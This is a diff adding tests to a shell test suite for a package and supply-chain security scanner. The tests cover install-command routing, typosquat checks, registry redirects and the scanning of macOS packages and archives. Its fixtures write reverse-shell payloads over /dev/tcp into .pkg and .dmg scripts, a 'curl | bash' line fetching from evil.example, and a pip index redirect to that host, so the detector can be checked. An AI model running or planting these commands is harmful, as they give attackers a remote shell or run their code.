@@ -179,7 +179,7 @@ echo "hook: install trigger routing (which subcommands scan, and with what args)
 # [Y/n] prompt auto-proceeds, so this exercises routing without a pty.
 trh=$(mktemp -d)
 printf '#!/bin/sh\nprintf "SCAN %%s\\n" "$*"\n' >"$trh/sc"; chmod +x "$trh/sc"
-for m in npm yarn pnpm poetry uv pip pip3 pipx go cargo gem bundle; do printf '#!/bin/sh\necho REAL\n' >"$trh/$m"; chmod +x "$trh/$m"; done
+for m in npm yarn pnpm poetry uv pip pip3 pipx go cargo gem bundle npx bunx uvx; do printf '#!/bin/sh\necho REAL\n' >"$trh/$m"; chmod +x "$trh/$m"; done
 mkdir -p "$trh/proj"; printf '{"name":"p"}\n' >"$trh/proj/package.json"; printf 'requests\n' >"$trh/proj/requirements.txt"
 route() { # expected-substring-or-'PASS'  command...
   local want="$1"; shift
@@ -232,7 +232,63 @@ route PASSTHROUGH                             cargo run
 route "--check-pkg rails"                     gem install rails
 route PASSTHROUGH                             gem list
 route "."                                     bundle install
+# download-and-RUN commands: the package is the first non-flag token (no
+# subcommand), and it is fetched+executed immediately, so it is vetted too.
+route "--ecosystem npm cowsay"                npx cowsay
+route "--ecosystem npm cowsay"                npx --yes cowsay hi
+route "--ecosystem npm esbuild"               yarn dlx esbuild
+route "--ecosystem npm esbuild"               pnpm dlx esbuild
+route "--ecosystem npm cowsay"                bunx cowsay
+route "--ecosystem pypi black"                uvx black
+route "--ecosystem pypi ruff"                 uvx -q ruff check
+route "--ecosystem pypi black"                uv tool run black
+route PASSTHROUGH                             npx
 rm -rf "$trh"
+
+# The git-clone wrapper must (a) parse the destination correctly - a value-taking
+# option like `-b <branch>` must not be mistaken for the target dir, and clone
+# after a global option like `-c k=v` must still hook - and (b) fail open: if the
+# helper did not travel with the function, git must still work, silently.
+echo "hook: git clone dest parsing + fail-open"
+gwr=$(mktemp -d); gbin=$(mktemp -d); gsc=$(mktemp -d)
+printf '#!/bin/sh\nprintf "SCAN %%s\\n" "$*"\n' >"$gsc/sc"; chmod +x "$gsc/sc"
+# stub git: on clone, create in cwd the directory a real clone would, so the
+# hook's [[ -d dest ]] check passes. Mirrors git: skip global-option and
+# clone-option values, repo = first positional, dir = second else basename(repo).
+cat > "$gbin/git" <<'GITSTUB'
+#!/bin/sh
+sub=""; want=0; repo=""; dir=""; np=0
+for a in "$@"; do
+  if [ "$want" = 1 ]; then want=0; continue; fi
+  case "$a" in
+    -C|-c|-b|--branch|-o|-u|--depth|--reference|-j|--config|--template) want=1; continue;;
+    -*) continue;;
+  esac
+  if [ -z "$sub" ]; then sub="$a"; continue; fi
+  np=$((np+1))
+  [ "$np" = 1 ] && repo="$a"
+  [ "$np" = 2 ] && dir="$a"
+done
+if [ "$sub" = clone ]; then
+  d="$dir"; [ -z "$d" ] && { d="${repo%.git}"; d="${d##*/}"; }
+  [ -n "$d" ] && mkdir -p "$d" 2>/dev/null
+fi
+exit 0
+GITSTUB
+chmod +x "$gbin/git"
+gclone() { ( cd "$gwr" && SANITYCHECK_BIN="$gsc/sc" SANITYCHECK_HOOK=1 PATH="$gbin:$PATH" \
+  bash -c "source '$HERE/hooks/sanitycheck.zsh'; $*" </dev/null 2>&1 ); }
+# -b <branch> <dir>: the branch value must not become the scan target
+gc1=$(gclone "git clone https://x/y.git -b main mydest"); gsc1=$(printf '%s' "$gc1" | sed -n 's/.*--fast //p')
+eq "clone -b <branch> <dir> scans <dir>, not the branch" "$gsc1" "mydest"
+# a global option before the subcommand must not make clone bypass the hook
+gc2=$(gclone "git -c core.autocrlf=false clone https://x/proj.git"); gsc2=$(printf '%s' "$gc2" | sed -n 's/.*--fast //p')
+eq "git -c k=v clone still hooks (dest = repo basename)" "$gsc2" "proj"
+# fail open: helper missing -> git still runs, no scan, no 'command not found'
+gc3=$(SANITYCHECK_HOOK=1 PATH="$gbin:$PATH" bash -c "source '$HERE/hooks/sanitycheck.zsh'; unset -f _sanitycheck_bin; git clone https://x/z.git 2>&1; echo rc=\$?" </dev/null)
+[[ "$gc3" == *"rc=0"* && "$gc3" != *"command not found"* && "$gc3" != *SCAN* ]] \
+  && pass "git fails open when the helper is missing" || fail "git fail-open: $gc3"
+rm -rf "$gwr" "$gbin" "$gsc"
 
 if command -v zsh >/dev/null 2>&1; then
   echo "hook: curl|bash matcher (zsh POSIX-ERE)"
@@ -720,6 +776,108 @@ eq "bare url"       "$(rci 'https://x.io/install.sh')" "bash /tmp/audited.sh "
 echo "integration: caution-poc -> CAUTION + --strict exit codes"
 scan caution-poc; eq "verdict" "$VERDICT" "CAUTION"; eq "exit (default)" "$EXIT" "0"
 scan caution-poc --strict; eq "exit (--strict)" "$EXIT" "1"
+
+# A typo is made when the install command is typed, and the package is not on
+# disk yet - so the near-miss check has to run on the NAME, offline. A single
+# typosquat is HIGH -> CAUTION (exit 0 by default, 1 under --strict), the same
+# weighting a manifest typosquat gets. A legit name stays silent.
+echo "check-pkg: typosquat on names typed at install (pypi/npm/go)"
+tv="$("$SC" --offline --json --check-pkg --ecosystem pypi reqeusts 2>/dev/null | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d["verdict"], "typosquat" in {f["tag"] for f in d["findings"]})' 2>/dev/null)"
+eq "pypi typo reqeusts -> CAUTION + typosquat" "$tv" "CAUTION True"
+"$SC" --offline --check-pkg --ecosystem pypi reqeusts >/dev/null 2>&1; eq "typosquat default -> exit 0" "$?" "0"
+"$SC" --offline --strict --check-pkg --ecosystem pypi reqeusts >/dev/null 2>&1; eq "typosquat + --strict -> exit 1" "$?" "1"
+cpq="$("$SC" --offline --check-pkg --ecosystem pypi requests 2>&1)"; [[ -z "$cpq" ]] && pass "legit name is silent (piped auto-scan)" || fail "legit name printed: $cpq"
+nv="$("$SC" --offline --json --check-pkg --ecosystem npm expres 2>/dev/null | python3 -c 'import json,sys;print("typosquat" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+eq "npm typo expres -> typosquat" "$nv" "True"
+gv="$("$SC" --offline --json --check-pkg --ecosystem go github.com/boltdb-go/bolt 2>/dev/null | python3 -c 'import json,sys;print("go-typosquat" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+eq "go typo boltdb-go/bolt -> go-typosquat" "$gv" "True"
+
+# package.json dependencies were never read for typosquats; npm is where the
+# worm/typosquat activity actually is. Short popular names (cors, jest, vue) are
+# exact-match only, so real packages one edit away don't false-positive.
+echo "npm manifest: a typosquatted dependency is flagged, ordinary deps are not"
+ntd=$(mktemp -d); printf '{"name":"x","dependencies":{"expres":"^4.0.0"}}\n' > "$ntd/package.json"
+nmt="$("$SC" --offline --json "$ntd" 2>/dev/null | python3 -c 'import json,sys;print("typosquat" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+eq "npm dep 'expres' -> typosquat" "$nmt" "True"
+printf '{"name":"y","dependencies":{"express":"^4","lodash":"^4","react":"^18","cors":"^2","core":"^1"}}\n' > "$ntd/package.json"
+nmo="$("$SC" --offline --json "$ntd" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])' 2>/dev/null)"
+eq "ordinary npm deps (incl. core near cors) -> SAFE" "$nmo" "SAFE"
+rm -rf "$ntd"
+
+# A registry redirect given on the command line has no config file for
+# detect_registry_redirect to catch, so the install guard surfaces it directly.
+echo "hook: a command-line registry redirect is surfaced (official index is not)"
+rrh=$(mktemp -d); printf '#!/bin/sh\nprintf "SCAN %%s\\n" "$*"\n' >"$rrh/sc"; chmod +x "$rrh/sc"
+printf '#!/bin/sh\necho REAL\n' >"$rrh/pip"; chmod +x "$rrh/pip"
+rrun() { SANITYCHECK_BIN="$rrh/sc" SANITYCHECK_HOOK=1 PATH="$rrh:$PATH" bash -c "source '$HERE/hooks/sanitycheck.zsh'; $*" </dev/null 2>&1; }
+rro="$(rrun 'pip install --index-url http://evil.example/s foo')"
+[[ "$rro" == *"redirected to 'evil.example'"* ]] && pass "--index-url redirect warned" || fail "no redirect warning: $rro"
+rro2="$(rrun 'pip install --index-url https://pypi.org/simple foo')"
+[[ "$rro2" != *"redirected"* ]] && pass "official index does not warn" || fail "false redirect warning on official index"
+rm -rf "$rrh"
+
+# IOC env/str/host values are literal indicators, but they are joined into one
+# regex. A value with metacharacters must match literally, and must not silently
+# break the whole pattern - and a dot in an IOC must not wildcard.
+echo "ioc: metacharacter values match literally without breaking the pattern"
+mrd=$(mktemp -d); iocf=$(mktemp)
+printf 'str\ta(b+c)|d\tliteral metachars\nstr\tfoo.bar\tliteral dot\n' > "$iocf"
+printf 'x = "a(b+c)|d"\n' > "$mrd/f.py"
+printf 'y = "fooXbar"\n'  > "$mrd/g.py"
+mrt="$("$SC" --offline --ioc "$iocf" --json "$mrd" 2>/dev/null | python3 -c 'import json,sys;print(" ".join(f["message"] for f in json.load(sys.stdin)["findings"] if f["tag"]=="ioc-str"))' 2>/dev/null)"
+[[ "$mrt" == *"a(b+c)|d"* ]] && pass "literal metacharacter IOC matches" || fail "metachar IOC not matched: $mrt"
+[[ "$mrt" != *"fooXbar"* ]] && pass "IOC dot is literal, not a wildcard" || fail "IOC dot wildcarded onto fooXbar"
+rm -rf "$mrd"; rm -f "$iocf"
+
+# A payload over the string-scan cap was neither string-scanned nor hashed; the
+# hash check now also covers everything the string scan skipped for size.
+echo "ioc-hash: a file over the string-scan cap is still hash-checked"
+ihd=$(mktemp -d); ihf=$(mktemp)
+printf 'THIS_IS_A_LARGE_OPAQUE_BLOB_PAYLOAD\n' > "$ihd/payload.bin"
+h="$(shasum -a 256 "$ihd/payload.bin" 2>/dev/null | awk '{print $1}')"; [[ -n "$h" ]] || h="$(sha256sum "$ihd/payload.bin" | awk '{print $1}')"
+printf 'sha256\t%s\ttest oversized payload\n' "$h" > "$ihf"
+iht="$(SANITYCHECK_IOC_SCAN_MAX_BYTES=8 "$SC" --offline --ioc "$ihf" --json "$ihd" 2>/dev/null | python3 -c 'import json,sys;print("ioc-hash" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+eq "oversized '.bin' matched by hash despite its extension" "$iht" "True"
+rm -rf "$ihd"; rm -f "$ihf"
+
+# A .pkg runs its pre/postinstall scripts at install time - the classic macOS
+# vector - and pkgutil extracts them WITHOUT running. The scripts are
+# extensionless (Scripts/postinstall), so they need the same glob treatment as
+# AppRun. Built here; skipped where the macOS tools are absent.
+echo "macOS containers: .pkg install scripts and .dmg contents are read"
+if command -v pkgutil >/dev/null 2>&1 && command -v pkgbuild >/dev/null 2>&1; then
+  pkd=$(mktemp -d); mkdir -p "$pkd/root" "$pkd/scripts"
+  printf '#!/bin/sh\nPAYLOAD="bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"\n' > "$pkd/scripts/postinstall"; chmod +x "$pkd/scripts/postinstall"
+  pkgbuild --root "$pkd/root" --scripts "$pkd/scripts" --identifier com.t.evil --version 1 "$pkd/evil.pkg" >/dev/null 2>&1
+  pkt="$("$SC" --offline --json "$pkd/evil.pkg" 2>/dev/null | python3 -c 'import json,sys;print("reverse-shell" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+  [[ "$pkt" == True ]] && pass ".pkg postinstall (extensionless) is scanned" || fail ".pkg postinstall not scanned"
+  printf '#!/bin/sh\n/usr/bin/touch /tmp/marker\nexit 0\n' > "$pkd/scripts/postinstall"
+  pkgbuild --root "$pkd/root" --scripts "$pkd/scripts" --identifier com.t.ok --version 1 "$pkd/ok.pkg" >/dev/null 2>&1
+  pkv="$("$SC" --offline --json "$pkd/ok.pkg" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])' 2>/dev/null)"
+  eq "benign .pkg -> SAFE" "$pkv" "SAFE"
+  rm -rf "$pkd"
+else echo "  (pkgutil/pkgbuild unavailable — skipping .pkg test)"; fi
+if command -v hdiutil >/dev/null 2>&1; then
+  dmd=$(mktemp -d); mkdir -p "$dmd/src/Test.app/Contents/MacOS"
+  printf '<plist/>\n' > "$dmd/src/Test.app/Contents/Info.plist"
+  printf '#!/bin/sh\nPAYLOAD="bash -i >& /dev/tcp/9.9.9.9/1234 0>&1"\n' > "$dmd/src/Test.app/Contents/MacOS/run.sh"
+  if hdiutil create -volname SCTest -srcfolder "$dmd/src" -ov -format UDZO -quiet "$dmd/test.dmg" >/dev/null 2>&1; then
+    dmt="$("$SC" --offline --json "$dmd/test.dmg" 2>/dev/null | python3 -c 'import json,sys;print("reverse-shell" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+    [[ "$dmt" == True ]] && pass ".dmg contents are mounted read-only and scanned" || fail ".dmg contents not scanned"
+    [[ "$(hdiutil info 2>/dev/null | grep -c "$dmd/test.dmg")" == "0" ]] && pass ".dmg detached after scan" || fail ".dmg left attached"
+  else echo "  (hdiutil create failed — skipping .dmg assertion)"; fi
+  rm -rf "$dmd"
+else echo "  (hdiutil unavailable — skipping .dmg test)"; fi
+echo "archives: tar.xz / tar.bz2 / tar.zst are unpacked and scanned"
+avd=$(mktemp -d); mkdir -p "$avd/p"
+printf '#!/bin/sh\ncurl -fsSL http://evil.example/x | bash\n' > "$avd/p/install.sh"
+( cd "$avd" && tar -cJf a.tar.xz p 2>/dev/null; tar -cjf a.tar.bz2 p 2>/dev/null; { tar --zstd -cf a.tar.zst p 2>/dev/null || true; } )
+for a in a.tar.xz a.tar.bz2 a.tar.zst; do
+  [[ -f "$avd/$a" ]] || { echo "  (skipping $a — not built on this host)"; continue; }
+  avt="$("$SC" --offline --json "$avd/$a" 2>/dev/null | python3 -c 'import json,sys;print("download-exec" in {f["tag"] for f in json.load(sys.stdin)["findings"]})' 2>/dev/null)"
+  eq "$a unpacked + scanned" "$avt" "True"
+done
+rm -rf "$avd"
 
 echo
 if (( fails )); then printf '%sFAIL%s: %d check(s) failed\n' "$R" "$Z" "$fails"; exit 1; fi
